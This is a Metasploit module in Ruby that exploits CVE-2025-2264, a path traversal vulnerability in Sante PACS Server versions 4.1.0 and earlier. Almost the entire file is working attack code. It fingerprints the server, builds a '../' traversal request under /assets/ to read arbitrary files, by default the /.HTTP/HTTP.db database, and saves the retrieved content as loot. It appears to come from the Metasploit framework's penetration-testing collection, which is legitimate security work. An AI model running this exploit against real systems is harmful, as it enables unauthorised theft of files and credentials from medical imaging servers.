##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sante PACS Server Path Traversal (CVE-2025-2264)',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2025-2264) in Sante PACS Server <= v4.1.0 to retrieve arbitrary files from the system.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Tenable' # Discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2264'],
          ['URL', 'https://www.tenable.com/security/research/tra-2025-08']
        ],
        'DisclosureDate' => '2025-03-13',
        'DefaultOptions' => {
          'RPORT' => 3000,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for PACS Server', '/']),
        OptString.new('FILE', [false, 'The file path to read from the target system.', '/.HTTP/HTTP.db']),
        OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 3 ])
      ]
    )
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'index.html')
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown('Connection failed')
    end

    if res&.code == 200
      data = res.to_s
      if data.include?('Sante PACS Server PG')
        return CheckCode::Detected('Sante PACS Server PG seems to be running on the server.')
      end

    end
    return CheckCode::Safe
  end

  def run
    traversal = '../' * datastore['DEPTH'] + datastore['FILE']
    traversal = traversal.gsub(%r{/+}, '/')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'assets', traversal)
    })

    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res&.code != 200
    print_good("File retrieved: #{target_uri.path}assets/#{traversal}")

    path = store_loot('pacsserver.file', 'text/plain', datastore['RHOSTS'], res.body, datastore['FILE'], 'File retrieved through PACS Server path traversal.')
    print_status("File saved as loot: #{path}")
  end
end
